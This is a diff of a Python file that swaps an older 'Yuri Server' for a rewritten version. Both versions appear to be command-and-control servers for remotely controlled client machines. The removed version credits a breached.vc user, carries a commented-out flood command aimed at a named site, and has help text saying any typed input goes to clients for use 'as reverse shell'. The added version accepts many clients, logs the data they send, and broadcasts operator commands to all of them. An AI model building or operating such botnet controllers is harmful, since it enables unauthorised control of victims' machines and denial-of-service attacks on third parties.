@@ -1,204 +1,174 @@
 import socket
-import os
-import random
-import asyncio
-import threading
-import colorama
-from colorama import Fore
+import threading 
+#this will store the logs
+logs = {}
+#here we'll store the client handlers so we can manage clients separately
+clients = {}
+#the client handle(used to accept and manage connections)
+class ClientHandle:
+    #accept connection, socket_a is the socket object
+    def accept(self, socket_a):
+        self.socket = socket_a 
+        
+        self.connection, self.address = self.socket.accept()
+        global clients 
+       
+        print(self.connection)
+        #checking availability of an idenificator for our client handler
+        threading.Thread(target=self.check_identity).start()
+        self.data_thread = threading.Thread(target=self.receive_data).start()
+    def logs(self, log):
+        global logs 
+        logs[str(self.address)] = log
+    def check_identity(self):
 
-from signal import signal, SIGPIPE, SIG_DFL  
-signal(SIGPIPE,SIG_DFL)
-
-greetings_n = random.randint(1, 3)
-if int(greetings_n) == 1:
-    print(Fore.RED + " ______   _____ ______   _____    ___________        ____________   ")
-
-    print(Fore.RED + "|\     \ |     |\     \  \    \   \          \      /            \  ")
-
-    print(Fore.RED + "\ \     \|     | \    |  |    |    \    /\    \    |\___/\  \\___/| ")
-    print(Fore.RED + "\ \           |  |   |  |    |     |   \_\    |    \|____\  \___|/ ")
-    print(Fore.RED + "\ \____      |  |    \_/   /|     |      ___/           |  |      ")
-    print(Fore.RED + "\|___/     /|  |\         \|     |      \  ____   __  /   / __  ")
-    print(Fore.RED + "   /     / |  | \         \__  /     /\ \/    \ /  \/   /_/  |  ")
-    print(Fore.RED + " /_____/  /   \ \_____/\    \/_____/ |\______||____________/|  ")
-    print(Fore.RED + "|     | /     \ |    |/___/||     | | |     ||           | /  ")
-    print(Fore.RED + "|_____|/       \|____|   | ||_____|/ \|_____||___________|/   ")
-    print(Fore.RED + "                   |___|/                                  ")
-elif int(greetings_n) == 2:
-    print(Fore.BLUE + " __  __     __  __     ______     __     ")
-    print(Fore.BLUE + "/\ \_\ \   /\ \/\ \   /\  == \   /\ \    ")
-    print(Fore.BLUE + "\ \____ \  \ \ \_\ \  \ \  __<   \ \ \   ")
-    print(Fore.BLUE + " \/\_____\  \ \_____\  \ \_\ \_\  \ \_\ ")
-    print(Fore.BLUE + "  \/_____/   \/_____/   \/_/ /_/   \/_/  ")
-elif int(greetings_n) == 3:
-    print(Fore.GREEN + "                    ___           ___                   ")
-    print(Fore.GREEN + "      __           /  /\         /  /\           ___    ")
-    print(Fore.GREEN + "     |  |\        /  /:/        /  /::\         /__/\   ")
-    print(Fore.GREEN + "     |  |:|      /  /:/        /  /:/\:\        \__\:\  ")
-    print(Fore.GREEN + "     |  |:|     /  /:/        /  /::\ \:\       /  /::\ ")
-    print(Fore.GREEN + "     |__|:|__  /__/:/     /\ /__/:/\:\_\:\   __/  /:/\/ ")
-    print(Fore.GREEN + "     /  /::::\ \  \:\    /:/ \__\/~|::\/:/  /__/\/:/~~  ")
-    print(Fore.GREEN + "    /  /:/~~~~  \  \:\  /:/     |  |:|::/   \  \::/     ")
-    print(Fore.GREEN + "   /__/:/        \  \:\/:/      |  |:|\/     \  \:\     ")
-    print(Fore.GREEN + "   \__\/          \  \::/       |__|:|~       \__\/     ")
-    print(Fore.GREEN + "                   \__\/         \__\|                  ")
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-hostname = socket.gethostname()
-hostip = socket.gethostbyname(str(hostname))
-port = 27034
-try:
-    s.bind((hostip, port))
-except:
-    print("[ERROR] Couldn't bind ip/port, IP/PORT is out of range or already in use!")
-    exit(0)
-s.listen(500)
-print(f"listening on {hostip}:{port}")
-print("")
-
-class server:
-    def __init__(self):
-        self.stop_threads = False
-        self.clients = []
-        self.addr = []
-    def start(self):
-        print("TYPE 'help' TO START!")
-        self.listen_thread = threading.Thread(target=self.listen)
-        self.listen_thread.start()
-        self.command_thread = threading.Thread(target=self.command)
-        self.command_thread.start()
-        self.logs_thread = threading.Thread(target=self.logs)
-        self.logs_thread.start()
-    def listen(self):
-        print("[LISTENING]: READY")
-        #print(1)
+        #assigning an identificator for a client based on number of clients currently connected
+        self.ident = 0
+        for i in clients:
+            self.ident+=1 
+       
         while True:
-            global c, addr
-            c, addr = s.accept()
-            
-           # print("[LOGS]: READY")
-            
-            
-            self.clients.append(c)
-            self.addr.append(addr)
-            if self.stop_threads:
-                print("DEBUG 1")
-                return 
-                
-            print(f"\n[LOGS]: Connection from {addr}")
-                #current_dir_cont = os.listdir()
-            #if str(f"{addr}.ydata") in current_dir_cont:
-             #   number_id = random.randint(-5000000, 5000000)
-              #  os.rename(str(f"{addr}.ydata"), str(f"{addr}{str(number_id)}.ydata"))
-            #with open(f"{addr}.ydata", "w+") as log:
-             #   logdata = s.recv(2048).decode()
-              #  log.write(str(logdata))
-               # log.close()
-           # res = s.recv(2048).decode()
-           # print(res)
-          #  command = input("[YURI-SERVER]: command->")
-            #time.sleep(2)
-            #s.close()
-            #s.send("flood http://minexware.cc/".encode())
-    def logs(self):
-        while True:
-            if self.stop_threads:
-                print("DEBUG 2")
-                break
             try:
-                resp = s.recv(2048).decode()
-                print(Fore.GREEN + resp)
-                '''with open("logs.txt", "r") as lgs:
-                    data = lgs.read()
-                    lgs.close()
-                with open("logs.txt", "w") as logs:
-                    logs.write(data + f"{c}" + resp + "\n")
-                    logs.close()'''
+                self.ident+=1
+                print(clients[self.ident])
+                #clients[self.ident]=self.connection
             except:
-                continue
-    def command(self):
-        while True:
-            
-            if self.stop_threads:
-                print("DEBUG 2")
+                
+                clients[self.ident]=self.connection
                 break
-            comm = input("[YURI-SHELL]: ").lower()
-            #stripped = comm.strip(" ")
-            if comm.strip(" ") == "":
-                print("[ERROR]: No command supplied, skipping")
-            elif comm == "exit":
-                try:
-                    s.close()
-                    print("connections closed")
-                except:
-                    print("Failed to stop sockets")
-                print("[LOGS]: Stopping Threads")
-                self.stop_threads = True
+    #function for receiving data via the socket
+    def receive_data(self):
+       
+        while True:
+            try:
+                self.data = self.connection.recv(2048).decode()
+                print(self.data)
+                self.logs(self.data)
+                if not self.data:
+                    global clients
+                    clients.pop(self.ident)
+                    print(clients)
+                    print("removed a client")
+                    break
+            except:
                 
-                print("[LOGS]: Closing...")
-                #raise KeyboardInterrupt
-                
-                
-                exit(0)
-            elif comm == "info":
-                print("Yuri Server")
-                print("Release: 0.9.6")
-                print("Made by https://breached.vc/User-Minex")
-            elif comm == "clients":
-                print(f"[CONNECTIONS]: {self.addr}")
-            elif comm == "health":
-                
-                print(f"\n[LISTENING-THREAD]: {self.listen_thread.is_alive()}")
-                print(f"[SHELL-THREAD]: {self.command_thread.is_alive()}\n")
-            elif comm == "kick":
-                who = input("client->")
-                try:
-                    self.addr.remove(who)
-                    cnum = -1
-                    
-                    
-                    
-                    
-                    print("[LOGS]: Kicked a client")
-                except Exception as e:
-                    print(f"[ERROR]: Malfunction {e}")
-            elif comm == "help":
-                print("\n###SERVER COMMANDS###")
-                print("info ##prints info about this program")
-                print("health ##prints thread's health(running or not)")
-                print("clients ##shows currently connected clients")
-                print("kick ##kick a client(unfinished)")
-                
-                print("ANYTHING ELSE YOU TYPE WILL BE SENT TO THE CLIENT AS A COMMAND, YOU CAN USE IT AS REVERSE SHELL!")
-            else:
+                clients.pop(self.ident)
+                print(clients)
+                print("removed a client")
+                break
+    #literally closes the connection from this client
+    def close(self):
+        self.connection.close()
+    #unused, can send the client a command
+    def send_command(self, command):
+        self.connection.send(str(command).encode())
+#server >w<
+class Server():
+    #declaring some variables we will work with
+    def __init__(self):
+        self.port = int 
+        self.max_clients = int 
+        self.ip = int
+        self.connections = []
+        self.supress_message = False
+    #this function gets called the first, used to start the server
+    def start(self):
+        #reads the config
+        self.read_cfg()
+        #starts the listening thread(for clients)
+        threading.Thread(target=self.listen).start()
+    #used for internal commands, will send the client our command anyway. It's not like that it matters 'cuz they won't be able to see anything
+    def recognize_internal_command(self):
+        #need to use the global for this, otherwise we'd get an error
+        global clients
+        #just checking for recognized commands
+        #.strip() strips it of spaces and .lower() converts UPPERCASE letters into lowercase
+        if self.command.strip().lower() == "clients":
+            print(clients)
+            print(f"[SERVER]: Connected clients->{len(clients.keys())}")
+        elif self.command.lower() == "client info":
+            print(clients[self.command.split("client info")[1]])
+        elif self.command.strip().lower() == "help":
+            print("All commands: help, clients, client info [client], ")
+        elif self.command.strip().lower() == "shm":
+            self.supress_message = not self.supress_message
+        else:
+            if not self.supress_message:
+                print("Need help? Type 'help' or shm to 'supress' this message")
+    #function(we thread this one) for receiving input and sending it to the client
+    def commands(self):
+        while True:
+            self.command = input("command->")
+            #we call all the functions here
+            self.recognize_internal_command()
+            self.send_all_comms(self.command)
+    #this one sends all clients a command
+    def send_all_comms(self, command):
+        #using global again so there aren't any errors
+        global clients
+        #for loop used to get every connection we have saved and sending data to the client
+        for client in clients:
+            try:
+                clients[client].send(str(command).encode())
+            except:
+                print(f"[ERROR]: Couldn't send command to {clients[client]}")
             
-                print("[LOGS]: Sending command to clients")
-                for client in self.clients:
-                    try:
-                        client.sendall(str(comm).encode())
-                    except Exception as e:
-                        print(f"{client} failed to respond")
-                print("[LOGS]: Sent command to clients")
-           #     continue
-                #print("[ERROR]: Couldn't send command")
-            
-            
-def keyboardi():
-    try:
-        1-1
-    except KeyboardInterrupt:
-        print("exiting")
-        exit(0)
-server().start()
-#interrupt = threading.Thread(target=keyboardi)
-#interrupt.start()
-'''
-listen_thread = threading.Thread(target=listen)
-listen_thread.start()
-command_thread = threading.Thread(target=command)
-command_thread.start()'''
+           
+    #reading the config for the server
+    def read_cfg(self):
+        #using try/except so if there isn't a config a new one will be made
+        try:
+            #reading an existing one
+            with open("server.cfg", "r") as config:
+                self.lines = config.read()
+                self.port = int(self.lines.split("\n")[0].split("=")[1])
+                self.max_clients = int(self.lines.split("\n")[1].split("=")[1])
+                self.ip = self.lines.split("\n")[2].split("=")[1]
+                config.close()
+            print("[LOGS]: Config loaded")
+        #if there isn't one this gets executed
+        except Exception as e:
+            #printing the exception message
+            print(e)
+            #making the new cfg and assigning the values to variables
+            with open("server.cfg", "w+") as config:
+                self.localip = socket.gethostbyname(socket.gethostname())
+                config.write(f"port=4465\nmax clients=500\nip={self.localip}\n")
+                self.port = 4465
+                self.max_clients = 500
+                self.ip = self.localip
+                config.close()
 
-'''Shit didn't work, switched to threading'''
-#asyncio.run(listen())
-#asyncio.run(command())
-#asyncio.run(logs())
+            print("[LOGS]: config made")
+    #listening thread for clients
+    def listen(self):
+        #making the socket so we can use all the networking stuff we need
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #binding it to the ip and port we specified in our config
+        self.socket.bind((self.ip, int(self.port)))
+        #max pending connections to our server, mislabeled as max clients
+        self.socket.listen(self.max_clients)
+
+        print(f"[LISTENING]: Started on {self.ip}, {self.port}")
+        #threading the commands function
+        threading.Thread(target=self.commands).start()
+        while True:
+            #a loop that will accept a client connection and make a new handler
+            ClientHandle().accept(self.socket)
+            
+            
+            print("[LOGS]: Accepted a new client connection")
+            #saving logs, if any
+            self.save_logs()
+    #used to save logs, doesn't get called often but made it anyway
+    def save_logs(self):
+        with open("logs.txt", "r") as log:
+            log_data = log.read()
+            log.close() 
+        with open("logs.txt", "w") as log:
+            global logs
+            log.write(log_data + f"\n{logs}")
+            logs.clear()
+            log.close()
+#starting the whole thing
+Server().start()
